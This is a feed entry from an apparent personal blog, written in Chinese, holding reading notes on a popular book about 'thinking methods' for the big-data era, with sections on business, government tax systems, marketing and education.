&lt;div id=&quot;outline-container-orgc162bcc&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgc162bcc&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;8.2&lt;/span&gt; 教学思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-8-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;大数据变革教育的第一波浪潮
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;翻转课堂是未来教育的课堂模式。采取让学生在上课前先学习教学视频，在课堂上完成作业或做实验的方式，而老师则在学生遇到学习困难时给予帮助，对他们进行一对一的个性化指导。&lt;/li&gt;
&lt;li&gt;MOOC风暴来袭，放大翻转课堂效应。&lt;/li&gt;
&lt;li&gt;微课程兴起：回应翻转课堂和MOOC浪潮。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org99581a6&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org99581a6&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;8.3&lt;/span&gt; 教育思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-8-3&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;“大数据时代”以不可挡的势头扑面而来，给教育界的人敲响了警钟，告诉他们：“原始”的教育方式已经成为过去，“新时代”已经袭来。&lt;/li&gt;
&lt;li&gt;“大数据”并不是一种技术的时尚潮流，而是在信息技术高度发展之后，人们如何开发利用数据为新的商业模式发展奠定基础的过程。与此同时，也是一种基于新工具解决问题的全新思路。&lt;/li&gt;
&lt;li&gt;“大数据”怎么样改变传统的教育？
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;第一个方面是改变教育研究中对数据价值的认识；&lt;/li&gt;
&lt;li&gt;第二个方面是方便校长、教师更全面了解每一个学生；&lt;/li&gt;
&lt;li&gt;第三个方面是帮助学生进行个性化高效学习。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;</content><author><name>杨倩</name></author><category term="Big-Data" /><category term="大数据" /><summary type="html">致胜大数据时代的50种思维方法 If you have questions, please send email to zrg1390556487@gmail.com. 1 前言 1.1 什么是大数据 最早提出“大数据”时代来临的是全球知名的咨询公司麦肯锡。“数据已经渗透到每一个行业和业务领域，成为重要的组成部分之一。人们对于海量数据的挖掘和运用，预示着新一波生产率增长和消费者盈余浪潮的到来。” 2008年9月，《自然》杂志推出了封面专栏——“大数据”，内容讲述了数据在生物、物理、工程、数学及社会经济等多方面学科所占据的位置和角色的重要性。 哈佛大学-社会学教授-加里·金说：“这是一场革命，庞大的数据资源使得各个领域开始了量化进程。无论学术界、商界还是政府，所有领域都将开始这种进程。” “大数据”，英文为&quot;Big Dat，，&quot;简单来说，“大数据”是一种巨量资料库，可以在合理时间内达到撷取、管理、处理并整理为帮助公司、企业经营和决策的资讯信息。 业界将“大数据”概括成四个V，即大量化(Volume)、多样化(Variety)、快速化(Velocity)和价值化(Value)。 大数据的信息量有多大？ 截止到2012年，数据量已经从TB级别跃升到PB、EB乃至ZB级别。（1024GB=1TB，1024TB=1PB，102**B=1EB，1024EB=1ZB）。 2008年，全球产生的数据量为0.49ZB；2009年的数据量为0.8ZB；2010年的数据量为1.2ZB；2011年的数据量更是持续增长，竟高达1.82ZB。这个数据量，相当于全世界的每个人产生200GB以上的数据。 IBM公司称，截止到2013年10月，全世界所获得的数据中，有90%都是过去两年内产生的。预计到2020年时，全世界所产生的数据规模将达到今天的44倍。 “大数据”不仅是量大而已，它还具有多样化、快速化、价值化等优势。 截止到2012年10月，大数据所形成的市场规模在51亿美元左右。到了2017年，此数据预计会上涨到530亿美元。 1.2 改变思维模式，用数据说话 来举一个简单的例子：苹果公司创始人史蒂夫·乔布斯在罹患癌症后，不惜花费巨额抽取了全身的DNA信息。这样一来，医生就可以根据他全身的DNA信息来判断癌细胞的变化，从而对症下药。然而，对于普通的患者来说，是拿不出巨额钱款来做这种抽取检测的。换句话说，医生只能从普通患者身上提取很小的一部分DNA信息。两者的治疗效果有多大差异，可想而知。 再来举个简单的例子：如果你上淘宝，登录支付宝账户，点开电子对账单，你是不是能够看到自己一年的消费曲线图？是不是能够看到每个月的支出和收入？是不是能够看到自己的钱花到哪里去了？是不是比拿笔记账清晰和准确得多？根据网络购物的数据中，你还会发现：哪个城市的男人比女人购买的东西还要多；哪个城市的人用支付宝缴纳水电费的频率最高；什么星座的男性或女性在某年的消费额最高；在一年里，在父母或亲友身上花费了多少；节假日时，什么东西最畅销…… 大数据专家维克托·迈尔-舍恩伯格在《大数据时代》中是这样解释的：云计算在获取海量数据的同时，也带来了数据的混杂性，这会给传统的数据分析带来一些困扰。在以往，我们习惯于由数据得出具体结果。而在大数据时代，我们应当关注的是数据之间的相关关系，而不是数据之间的因果关系。 数据之间的相关关系可以帮助我们捕捉现在的线索和预测未来。如A和B的情况经常一起发生，那么只要注意到B情况发生，就能预测A的情况是怎么样的。这种“A和B”的关系在零售行业和IT行业中已被广泛运用。7-11便利店通过分析零售终端的数据，得出了这样的一个相关关系—温度低于15摄氏度，暖宝宝的销售量便增加5%。于是，只要温度低于这一度数，7-11便利店内的暖宝宝就会上架；豆瓣电台会推荐一些你可能会喜欢的音乐；当你在当当网买某本书后，系统就会提醒你—购买这本书的人中，有30%也购买了另外一本书…… 2 大数据是一场革命 2.1 定律思维 此前，在大数据中，有两个较为突出的定律：一秒定律或秒级定律和摩尔定律。 什么叫一秒定律或秒级定律？指的是对处理速度有要求，一般要在秒级时间给出准确的分析结果。 什么叫摩尔定律？ 指的是简单地评估出半导体技术进展的经验法则，其重要的意义是对于长期来说的，IC制程技术是以一直线的方式向前推展，使得IC产品能持续降低成本，增加功能和提升性能。 大数据时代，人们更要重视统计学。为什么要强调统计学呢？那是因为人们在认知能力中，统计思维算是最差劲的。要知道，人的大脑中有一些功能比较优良，甚至超过人们自身的想象，比如人们的语言能力。 举个例子：当一个人在深夜行走时，会敏锐地察觉到周边的变化。一旦感受到危险或不安的情绪时，就会立即逃跑，甚至大喊大叫。而与此同时，人的大脑之中还有另外一套操作系统，是用来做逻辑推理以及进行统计分析的，只是这个系统不怎么完善。于是，人们天生就缺乏逻辑推理能力和统计思维能力。 为什么大数据变成了一个最热门的词汇？主要的原因有两个。 第一个原因是，由于IT革命后，人们有了处理数据的多方面能力，有对计算机数据的处理能力、对计算机的存储能力以及对计算机的计算的能力，等等。再加上，人类储存信息量的增长速度要比世界经济增长的速度快四倍（这仅仅是在金融危机爆发之前的世界经济增长的速度）。而计算机数据处理能力的增长速度，要比世界经济增长的速度快九倍。 第二个原因是，社会上的一切现象以及企业的发展，能够被数据化的东西越来越多。 社科院世界经济与政治研究所副所长何帆总结出了大数据的三个规律： 第一个规律是知其然而不必知其所以然，外行打败内行； 第二个规律是彻底的价格歧视，商家比你更了解你自己； 第三个规律是打破专家的信息优势，病人给医生解惑。 2.2 集合思维 如果把毫不相干或紧密相连的数据组合到一个集合中，就能更有效地处理这些相关的数据。这些数据可以清晰地告诉我们：每一个客户的消费观念、倾向、爱好、需求等，哪些可以归为一类，哪些可以归为另一类。 大数据的集合是数据数量上的增加，能够实现从量变到质变的过程。 大数据的基本结构还分为三个层次，反映出观察数据库的不同角度。 第一层是物理数据层：是数据库最里面的一层，是物理存贮设备上实际存储的数据的集合。这些数据是最原始数据，也是供用户加工的对象。物理数据层由内部模式描述的指令操作处理的位串、字符和字组合而成。 第二层是概念数据层：是数据库置于中间的一层，也是数据库的整体逻辑的部分。这层数据层指出了数据与数据之间的逻辑定义和联系，是存贮资料的整合点。此时要注意的是，这层数据层所涉及的是数据库所有对象的逻辑关系，而不是其物理情况。 第三层是逻辑数据层：是体验用户能够看到和使用的数据库，也是能够证明用户使用过的证明和踪迹。 总之，小数据，大集合就是按照某种数据集中起来并存放二级存储器中的一种方式。这种数据集合还有着一定的特点，比如尽量不出现重复的情况。 2.3 创新思维 首先，大数据的创新思维可以推动并实现巨大的经济效益。 其次，大数据的创新思维可以增强社会管理水平。 最后，大数据所具备的创新思维还可以推动和提高安全保障能力。 2.4 转型思维 以广东省地税系统为例子，从几大方面来揭示大数据推动公共管理从传统向现代转型的趋势。 第一个方面就是：从粗放化向精细化转型。通过建立省级数据应用大集中征管信息系统，广东地税摆脱了以往人工操作的粗放型管理模式，真正实现了税款自动入库、自动划解和实时监控，实现了税款的稳定增长以及快速增长。再通过对海量信息的详细分析和研究，广东省对每一个商家或是企业都实现了精细化转型。比如说，在房地产方面，由于建筑行业的人员流动性大，操作的环节复杂，且没有规范性，就形成了一个比较难管的问题。但自从有了这个征管系统以后，大数据就能够实时获取房地产开发项目明细信息，其中包括土地使用权信息、房产销售进度、销售明细建筑工程进度以及各阶段的税款缴纳情况等，实现了项目从产生到消亡的全过程监控。 第二个方面就是：从单兵作战型向协作共享型转型。在以往，不同政府部门拥有着不同的信息系统，但很多数据由于相互独立，所以彼此之间没有共享的信息，这些信息单独拿出去，就没有了任何用处。而大数据应用的出现，就扫除了这个盲点，使其实现了数据信息的共享，从而最大限度地发挥了数据的功效。如今，工商、税务等系统每天都会进行信息实时交换，推动了地税机关在办证服务上的创新，从原来的限时办证，实现了目前的即时办证；从原来填写一百多项登记信息，实现了目前只填写八项必要信息内容，甚至实现了享受免填服务。不仅如此，广东省地税借助大数据平台，积极推进第三方涉税信息共享，还明确了二十多个部门共享信息，真正做到了为每个部门提供便利，为社会经济的发展也提供了更快捷、更便利的服务。 第三个方面就是：从柜台式向自助式全天候转型。根据纳税人的不同类别、涉税业务的不同、办理时段不同等信息，广东地税借助大数据平台，形成了自助式全天候的一种转型。比如，增添了很多服务格局—网上办税、纳税热线、服务大厅、短信服务、自助办税等多种渠道并存的大服务格局。通过自助办税终端系统，为纳税人节时省力，不仅不受地方区域的限制，也可以不受时间的限制，自行完成代开小额发票、打印缴款凭证、清缴税费、申报缴纳车船税等业务。 第四个方面就是：从被动响应型向主动预见型转型。为了能够更好地服务纳税人，广东省地税通过税收大数据平台，还推出了一项特别的服务，那就是全省集中统一的短信服务。这项服务会为六百多万的纳税人提供短信订阅服务，有针对性地对目标群体提供了多项短信服务，如逾期未申报短信提醒、未到期未申报短信提醒，还有发票开具短信提醒等。借助于大数据平台，广东省地税实现了对受众精确式的短信服务，避免了轰炸式、盲目性的短信服务，从而提升了服务质量。据统计称：截止到2011年，短信服务量超过1800万条；到了2012年，短信服务量已经超过5000万条。 第五个方面就是：从纸质文书向电子政务转型。现如今，广东省地税互联网电子税务局已基本建成，纳税人只需要短短的五分钟，就能轻松办税，而且还实现了网上缴纳，足不出户。此外，广东省还率先推行网络开具发票，一方面为纳税人提供了方便，节省了时间。一方面使税务机关能在第一时间掌握每张发票的信息，与企业纳税申报数据比对分析，及时总结出没有缴纳、少缴纳的税款情况。这一行动推广以后，还意外地打击了假发票泛滥的情况，也避免了一些人用假发票报销的现象。也因此，这一措施被国家税务总局誉为“税收管理史上的颠覆性举措”。 第六个方面就是：从风险隐蔽型向风险防范型转型。依托大数据平台，广东省地税建立了惩防体系信息管理系统，对地税干部的税收执法和行政管理实行了全程分析和监控，有效监督和杜绝了一些知法犯法和影响国家荣誉的风险出现。监控预警信息从最初每月收到近7000个，到2012年每月收到不足500个，下降了92%。可以说，自从大数据监控平台出现后，全系统违法违纪发案率大幅度降低，不足5‰，也没有什么重大的违纪案件出现，这就是最大的成功！ 2.5 战略思维 未来，大数据相关的技术和能力将成为一个国家至关重要的核心战略资源。 2012年3月，美国总统***政府宣布推出一项发展计划——“大数据的研究和发展计划”。 2013年2月，法国政府发布了一项关于《数字化路线图》的技术措施，列出了五项将会大力支持的战略性高新技术，“大数据”位列其中。在这项措施中，法国政府将以软件制造商、工程师、新兴企业、信息系统设计师等为目标，开展一系列投资计划，旨在通过创新型和科学性的解决方案，将大数据运用到实际生活中。 2012年9月，日本总务省也发布了一项行动计划，提出“通过大数据和开放数据开创新市场”，以复苏日本为目的推进“活跃在ICT领域的日本”ICT综合战。 大数据的价值主要体现在三个方面。 第一个方面，是能够实现巨大的商业价值。 第二个方面是能够增强社会管理水平。 第三个方面是能够提高安全保障能力。 3 应对传统模式的大数据思维 3.1 扩散思维 为了更好地分析大数据之间的关联性和扩散性，Facebook使用了HBase。HBase是Apache（世界使用排名第一的Web服务器软件）的另外一款产品，使用了独特定义的一组表格。HBase可以像Hadoop（一个分布式系统基础架构，由Apache基金会所开发）一样执行大数据处理产品的能力，以更迅速、更精细的方式来分析数据之间的连接。 以北京的交通为例子。北京有一个交通智能化分析平台，其数据通过分析源自路网摄像头、传感器、轨道交通、旅游、地面公交、出租车、客运等行业方方面面的数据，得出了这样的一个结果：高速ETC数据每天50万条；4万辆的浮动车每天会产生近2000万条记录；出租车运营为数据为每天100万条；交通卡刷卡的记录为每天1900万条；手机定位数据为每天1800万条……此外，还计算出了北京的人均上班平均用时为52分钟，全国平均人均上班用时39分钟。这些海量的数据，在体量和产生速度上都对存储和处理能力提出了非常高的要求。 3.2 颠覆思维 在大数据时代，创新和转变思维就意味着进步，意味着发展。而传统的、守旧的思维已经不适用于这个时代。因此，转变思维是大数据时代的必然趋势。 移动说，搞了这么多年，今年才发现，腾讯才是我们的竞争对手。一个小小的微信软件运用，给了电话和短信致命性的一击！ 国内最大的免费安全平台360互联网安全中心能够颠覆传统杀毒软件市场，成为No.1。 诸多残酷的现实告诉我们：如果还停留在过去，不懂得转变，那只能被大数据时代淘汰！ 3.3 量变思维 信息总量的变化导致了信息形态的变化，也就是量变引发了质变。大数据也一样，量变导致质变。 计算机数据处理能力的增长速度非常快，快得令人咂舌。这个速度比世界经济的增长速度还要快九倍； 人类存储信息量的增长也迅速增长，比世界经济的增长快四倍； 曾经，欧洲的信息存储量用了50年才增长了一倍，如今每三年就能增长一倍。 在金融领域，美国股市每天的成交量高达70亿股，Facebook每天更新的照片量超过1000万张，每天，人们会在网站上点击“喜欢”按钮或写评论约30亿次，谷歌公司每天要处理超过24拍字节的数据。 3.4 优劣思维 事物都是一分为二的，有优势，也有劣势，大数据也是如此。 大数据的劣势。 首先，大数据存在隐私泄露的情况。 其次，大数据只能发现过去，不能左右未来。 3.5 冲击思维 大数据的冲击力体现在哪些具体方面： 第一个方面，大数据正在以无限的增长方式突破有限的增长。 第二个方面，大数据正在以效益递增突破。 第三个方面，大数据是和谐共赢的，它突破了对立和矛盾的发展。 互联网的时代，你需要互联网思维，当然不是那种越来越“玄”的互联网思维，而是一种回归常识的互联网思维。 4 新数据时代的新思维 4.1 幂律思维 幂律是大数据所遵循的基本定理，什么是幂律？它指的是几何平均定值，如有一万个连线的大节点有十个，有一千个连线的中节点有一百个，一百个连线的小节点有一千个……在对数坐标上画出来会得到一条斜向下的直线。 幂律和爆发点的相伴相生 爆发改变了一切 4.2 效率思维 大数据的精准和效率 大数据能掌控电视剧收视率 大数据还能追女朋友 4.3 邮件思维 邮件思维是什么？是在用户默许的情况下，通过电子邮件的方式向用户传递有价值信息的一种营销手段。营销手段是利用邮件与用户、客户进行商业交流的一种直销方式。 会员才是邮件营销的核心，与传统的纸质邮件相比，邮件营销更高效、更快捷。 大数据时代的邮件营销 邮件营销最注重的是数据信息的收集和整合，各行各业都希望用“短平快”的方式，直接购买邮件地址，不断地给用户或客户发送营销邮件，从而明确目标群，获得订单。但这种营销的效果越来越不明显。 由于多年来在邮件营销领域的经验和积累，webpower获得了海量的用户数据信息。通过对这些数据的分析和整理，webpower将为客户带来昂贵的价值。在大数据技术的支持和帮助下，webpower可以针对用户点击的内容进行深入分析和挖掘，为其制定个性化的邮件策略。此外，webpower还可以对用户使用邮箱的历史数据，设定为触发式邮件。在必要的时候，可以启用短信、微信等参与进来，提醒用户哪些是有价值的营销邮件。 邮件营销与网络营销、数据库营销以及新媒体等的结合越来越紧密。如何提升邮件营销给企业带来更大的价值，是IT行业急需探索的问题。 4.4 定位思维 网站零售在挖掘顾客喜好时运用了两种方式。 第一种方式是从消费者的购买行为上来判断他们之间相同的地方。比如，当你在网上买电子产品时，网站就会跳出对话框或在网页下端提醒你—购买这款电子产品的人也购买了其他哪些电子产品。就是这样，网站零售商找到了“人以群分”的结合点。 第二种方式是从商品上入手，网络零售商通过判断商品之间的关联性推荐给消费者。比如，你想要买一件裤装，网站就会推荐一款T恤或衬衫，从而找到“物以类聚”的结合点。 余额宝的成功，最重要的就是定位准确。天弘基金副总经理，增利宝余额宝项目组组长周晓明此前曾表示：“小公司走老路，干是找死，不干是等死。穷则思变，中小公司一定要创新。” 4.5 逆向思维 股神巴菲特有这样的一句名言：别人贪婪时我恐惧，别人恐惧时我贪婪。换句话理解，就是人们需要有一种逆向思维，这也是对创新的另一种理解。 IBM公司曾经是世界上最大的计算机公司，也曾是世界上经济效益最好的计算机公司。1985年，IBM公司的通用大型机毛利率高达85%，中小型机毛利率高达50%，占世界通用大中型计算机市场的70%。到了20世纪80年代后期开始，计算机开始向小型化的个人电脑发展。到了1993年，IBM公司连续亏损，亏损的金额高达168亿美元。为了集中精力进行硬件开发，IBM公司就把个人电脑的操作系统授权给了微软公司。随着IBM个人电脑兼容机的大规模普及，微软和英特尔占据了个人电脑产业系统的核心位置，而IBM硬件则逐渐被边缘化了。 苹果公司运用逆向思维，另辟蹊径，用一种全新的方式建立了新的产业形态，撼动了微软和英特尔的领导地位。 逆向思维运用得好，就会将缺点变成优点，把不可能变成可能。 纵观这些企业之间的竞争和案例，无不告诉我们这样一个道理：“当你面对强手的时候，千万不要被对方牵着鼻子走，而是寻找到自己的节奏，迈出适合自己的步伐，脚踏实地，并懂得“想他人所想不到，做他人所做不到”。 5 大数据能量的积累与爆发 5.1 关联思维 从数据中寻找出一定的相关关系，通过这种关系，大数据会做出预测，从而告诉大众结果。这就是大数据方法论的核心思想。 麻省理工学院气象学家洛伦兹曾向人们介绍过一种现象—“蝴蝶效应”。 一只南美洲亚马孙河流域热带雨林中的蝴蝶，偶尔扇动几下翅膀，两周后，美国得克萨斯州掀起了一场龙卷风。从表面上看来，似乎这之间毫无关系，但结果告诉我们，即使是微小的事情也极有可能与千里之外的一件事情发生关联，并带来改变。 5.2 双刃思维 “大数据时代”的隐患：只要你在网络上活动，无论你在做些什么，都会被“记录在案”，甚至不知在什么地方，又以哪种形式被人揪出来。更可悲的是，你想不想出来的主动权不是由自己说了算，而是由网络运营商来决定。 “大数据”是一把双刃剑，人们在享受大数据带来的机遇时，也不得不面临一个残酷的问题，以及可能爆发的大数据危机。 5.3 价值思维 “大数据”真的那么具有吸引力吗？ 网络用户每点击一次鼠标，每一次刷卡消费，都已经参与了数据的生成。可以说，每一个用户都是数字的生产者和消费者。 凭借如此精细的监测手段，完全可以知道一个人或一辆车的行踪，从而产生精细化的数据，用以描述各种物体、社会和整个环境的行为。有了这些数据，大大减少了社会的复杂度。 在商业领域，一家美国的公司已经利用大数据，在亚马逊的云平台上处理跟天气相关的信息，从而帮助农业种植者保障自己的收益。对企业数据信息的深度挖掘和分析，能够对经济运行的状况进行准确的预警，从而做出正确的应对决策。 在金融领域方面，大数据分析师都已经成为在美国华尔街基金股票分析和高频数据交易等领域最抢手的人才；在中国，阿里巴巴集团旗下的金融业务，也开始用大数据来发放“信用贷款”。 大数据时代带来了比以往机会更大的发展空间。这包括以下几个方面： 第一个方面，是技术创新的新空间。 第二个方面是商业模式的创新。 第三个方面是信息资产的经营。 第四个方面是客户关系管理。 第五个方面是个性化精准推荐。 6 大数据引导的商业变革 6.1 知识思维 “核心竞争力”这一理念，是由美国学者普拉哈德和哈默提出的。他们把其定义为：组织中的积累性学识，特别是关于如何协调不同的生产技能和有机结合多种技术流派的学识。 大数据的核心是思想，不是技术。 端到端是一个面向大数据的解决方案。英特尔的理念是在这个解决方案里实现数据价值的挖掘。所谓“端到端”，前端视频采集、分析、存储，及后端数据中心处理等。 总而言之，知识经济才是提高核心竞争力的有效途径。 首先，知识经济时代可以识别企业核心知识，并提高企业的创新能力。 其次，信息化建设可以使知识管理更有效地进行，提高企业的核心竞争力。 6.2 变革思维 大数据的价值不言而喻，但也有着两面性。 大数据催生了一批新型科技公司，吸纳科技人才就业，并为企业发展转型提供了新机遇； 另外一方面，大数据给个人、企业乃至国家带来了一些危机，如隐私、重构信息安全、竞争力差距拉大以及数据产权争端等问题。 大数据改变了人们的生活，塑造出了不同的个性化思维。 比如，人们白天在电脑前浏览网页或下个订单，第二天就能收到自己想要的东西；晚上出门消费，不再是给现金，而是刷卡；看电影也不再苦苦排队，而是提前团购或预订……由此，人们的行为举止都会被记录下来，从而产生数据 再比如，气候公司会根据各个城市的气温高低、降雨量、土壤的状况和往年的农作物产量等情况，预测出第二年农场的产量，甚至还向农户出售个性化保险； 阿里巴巴集团根据在淘宝网上中小企业的交易状况，筛选出财务健康和讲究诚信的企业，为其发放无须担保的贷款。 再举个例子：我们得到了一个人的短信和通话数据、他微博的内容数据、医保和社保的数据，还有城市交通数据、签到数据、社交关系数据等。通过这些数据，我们就能对这个人形成深刻的认识，从而为其打造出完全个性化的服务。 百度大数据关于技术方面的事例 百度大数据开放平台 百度工业革命 6.3 生产思维 人类的行为是否可以被预测？ 如何运用“私人定制”思维？ 大数据“定制化”需得具备几个条件： 首先，要有海量的数据； 其次，这些数据能够挖掘出对生产商家有价值的信息； 再次，具备挖掘这样的数据的技术能力； 最后，要有能力整合生产、流通和销售这些关键环节。 6.4 自动化思维 关于信息安全，大数据作出的最大贡献就是通过自动化分析处理与深度挖掘，将亡羊补牢式的处理，转向还没有发生前的自动化评估预测和应急措施。 大数据解析航空安防和自动化 首先，从目前来说，飞机是地球上最安全的旅行交通工具，比其他交通工具，如汽车、火车等安全级别高很多。 其次，飞机发生事故所造成的社会影响比其他交通工具发生事故造成的社会影响更大。 再次，国外的一些专家经过研究得出了一个结论，那就是：国际航班比国内航班出事故的概率要低一些。其实并非如此，所有国家的航班出现事故的概率都相差无几，并不是发达国家的国际航班就更安全一些。 最后，飞行过程中的安全概率是根据起飞和爬升到巡航高度，以及下降和着陆来决定的。当然了，这也是飞行中最容易出问题的地方。 6.5 导向思维 新生的婴儿在第一时间就得学会哭泣；上学时，坐进教室的第一时间就得知道上什么课，拿什么书；进入高中后，必须规划今后的人生，上什么学、学什么专业、找什么样的姑娘或嫁什么样的男人，从事什么工作……这些，都需要一个导向思维，如果仅仅靠得过且过，明天的事明天说，犹如行尸走肉一般，一生将无建树。当然，绝大多数的人们，不会甘于现状，苛求发展，即使没有真正发展，也在内心存在这样的渴望，并独自努力。 有了导向思维后，一切才会有规律地发展和进步，无论成功与否，其占据的位置都是其他特长所无法替代的。就好比当下就很火爆的阿里巴巴集团旗下的淘宝、天猫等，如果不是因马云的导向思维，怎么会有今天的互联网地位？ 马云的故事 “作为一个创业者，首先要给自己一个梦想。1995年我偶然有一次机会到了美国，然后我看见了、发现了互联网。我对技术几乎不懂，到目前为止，我对电脑的认识还是部分停留在收发邮件和浏览页面上。但是这并不重要，重要的是你到底有什么梦想。” 在创业前，马云已经不缺钱了，至少是不缺吃饭的钱。在那个年代，马云是一名外语教师，还开了一间翻译社，又做夜校老师，有多个渠道的收入来源。用今天的话来说，马云已经脱离了蚁族和蜗居的时代，完全是不愁吃喝的公务员的待遇。但是，有了如此安逸闲适的生活之后，马云为何还要出来创业呢？因为，他想要的并不是这些，而是梦想，一个伟大的梦想。 每个人都会说，我想要环球世界，我想要改变世界，我要让每一个人知道我的存在，为我的成功喝彩。可今天一过，继续过着朝九晚五的生活，在论坛或好友群吐槽工作的不易、上司不懂慧眼识英雄，闲时睡大觉、打游戏、三五好友瞎侃……如果你永远这样，那么你的导向思维没有起到任何作用，而仅仅是一个想法。 IBM大数据战略导向认知计算 2014年3月，在IBM公司大数据新闻发布会上，IBM大中华区大数据和分析及新市场总经理，全球企业咨询服务部合伙人Jason Kelley宣布：“2014年，IBM大数据战略将持续升级在大数据方向的投入。IBM将继续深入在金融、电信、医疗、零售、制造等各行业的实践；并增强大数据与分析与云计算、移动、社交等热点趋势的融合，以及实现认知分析与大数据应用的不断融合。” IBM大中华区大数据中心总监王晓梅说：“在未来的大数据与分析实践中，IBM将进一步帮助企业把分析注入关键业务流程，从‘六大要务’角度解析业务需求，并导出对应的大数据与分析战略蓝图。当前，我们将重点推行该六大要务中对于客户洞察和流程革新的指导，帮助企业通过使用社交媒体分析等进行客户关系管理、市场营销决策，通过利用预测性维护、实时预警等进行财务等运营流程的优化。” 从2005至今，IBM公司并购了35家以上的公司，比如，高速文件传输工具Aspera、IBM收购数据分析软件公司The Now Factory和备受关注的DaaS供应商Cloudant。综上所述，没有导向思维，就没有前进的动力和方向。没有大数据导向思维，就没有成功的可能性。 7 大数据的营销策略 7.1 测量思维 在进行大数据测试之前，首先要对测试需求做清晰的分析。 举个例子：假设一个本科院校的学籍管理系统主要是用来管理学生的，学生在系统中的生命周期一般是四年。根据学校现有的在校生数和五年内的每一年的招生数据，就可以分析出需要构造的各个学年下的学生数。接着，对测试需求做准确清晰的分析后，对输入的测试数据进行分析。 要求主要表现在两方面：一方面要求测试数据与生产环境数据一致。另一方面，就要求测试数据输入要满足输入限制规则，尽量覆盖到满足规则的不同类型的数据。 问题探讨：到底是什么影响人们的幸福感呢？ 随着物质生活水平的提高，生活质量越来越得到人们的重视，而且，社会的总体心态与人们的行为准则有着密不可分的联系。一些社会指标告诉人们：最容易产生负面情绪的人群，不一定是生活最困难的人群，而是期望值与自身生活水平差距较大的人群。 举个例子：关于幸福感的研究，学术界的大多人士都表明，幸福感是一种感觉，并不与财富的多少以及生活水平的高低成正比。社会心理学家曾列过这样的一个公式：期望实现值除以内心的期望值才等于人的情绪指数。期望实现值与内心期望值的比值一旦大于或等于1时，人就会处于一种兴奋的状态，就会感到满足；相反，如果期望实现值与内心期望值的比值小于1时，人就会感到压抑，“唉”声连连，甚至做出一些平时不做的极端事。 7.2 谈判思维 所谓谈判，说的就是彼此之间，为了实现某种目的而进行的一种意见交换，然后寻找到一个制衡点，寻求问题解决的途径并达成协议的过程。 在商业谈判中，我们绝对不能忽略数据对谈判结果产生的影响。 打个比方说，数据就好比是一棵大树的枝叶，而想要与另一棵大树做比较的时候，除了其主干因素外，这些枝叶就是最为明显的可比部分。也就是说，掌控足够多的数据，将在谈判过程中掌控先机。 如何利用数据在谈判中获得优势呢？ 掌控绝对的数据 还要有针对性 不利用数据，仅仅依靠过去经验和谈判员的弊端 对产品认识不足的情况很容易出现在谈判桌上，从而导致在谈判中失去主导地位。而且，由于这种产品知识比较抽象，将之比喻为对产品以及产品所在行业的市场直觉更为合适。而直觉又往往是很难通过言语表达出来的，这就使得我们很难组织出一套权威的术语来说服对方，所以，就很难赢得对方的认可。 更为重要的一点是，要想形成产品知识，还和销售人员有着至关重要的关系。 7.3 预算思维 在这个时代，财务所面对的数据规模将会越来越大，数据类型也将越来越复杂。那么，如何整理与统计这些杂乱无章的数据，让这些数据能够更直观明了地展现在人们面前，并且为企业管理者的经营决策提供有效的科学依据，则成为现阶段我们必然考虑的问题之一。 对此问题，业内人士表示，全面预算管理将是让企业大数据“活起来”的最好方式。首先，预算是根据历年的数据和某些调整信息，对未来时期进行分析评测，进而得出的信息。其次，它是由实际业务数据和预算数据相结合与比较之后，而设计出来的一套最佳管理方案。利用这套方案，可以让企业资源得到更充分的利用，从而在未来获得更大的利益回报。 笼统地说，全面预算管理解决方案是在对企业内外部大数据进行收集、处理、控制、分析、整合等的基础上，与其他工具结合，帮助企业更好地利用数据实现战略落地。 7.4 选定思维 你了解你的客户吗？你能分清你的客户群体中哪些是可以长久合作、哪些只是暂时短期的利益相互关系吗？你的营销和广告投入应该针对哪类客户群体，你都清楚吗？ 企业想要做到正确的定位客户，首先就必须先设定目标。 找到有价值的客户并不代表着就一定能够进行合作。 “建立品牌” 8 教育、教学正在大数据化 8.1 院校思维 “大数据”时代，如何推动和创新院校教育模式 区别：传统数据的整理方式能凸显学生整体的专业水平或整体素质、身体的发育状况、社会性情绪及适应性的发展，还有对学校的满意程度等。而大数据就不一样了，它具备的分析能力更广、更细腻。它可以去关注每一个学生的微观表现，比如，在考试时，他在一道题上逗留了多久；在不同学科课堂上，他开小差的次数是多少；在食堂吃饭，他喜欢吃什么，不喜欢吃什么；每个学生的出生日期，包括喜欢的颜色等。 这些数据对其他个体没有意义，但所有学生的数据整合起来对大数据分析就有价值了。比如旷课、纪律或课堂表现等预测模式，教育者就可以确认哪些学生退学的可能性较高。通过利用大数据来观察并分析对学生在课堂中点滴的表现，大数据帮助我们可以了解学生对知识的掌握程度以及感兴趣程度，进而让学校反思自己的教学模式是不是满足了学生的需求。有了大数据以后，教育工作者们就可以针对不同的学生进行不同的教育模式，从而真正做到因材施教和以人为本。 传统的院校决策模式总结为四种： 第一种是通过“合意”的过程来平衡大学内多方群体利益的“学院型”模式； 第二种是通过“扩散”程序表达不同权力集团、利益群体诉求的“政治型”模式； 第三种是决策程序无章可循、随意性大的“有组织无政府型”模式； 第四种是依靠决策者所具有的理性认知能力制定决策的“官僚主义”模式。 这四种模式的共同弱点在于缺少有力的决策支持依据，管理者实际上是以“有限理性”为基础，努力做出“足够好”的决策。 在大数据背景下的院校决策，可以为教育决策者提供和完善认知经验所缺乏的信息、知识和智慧。针对这样的情况，有学者将其称为以数据系统为支撑的“知会理性”决策模式。 8.2 教学思维 大数据变革教育的第一波浪潮 翻转课堂是未来教育的课堂模式。采取让学生在上课前先学习教学视频，在课堂上完成作业或做实验的方式，而老师则在学生遇到学习困难时给予帮助，对他们进行一对一的个性化指导。 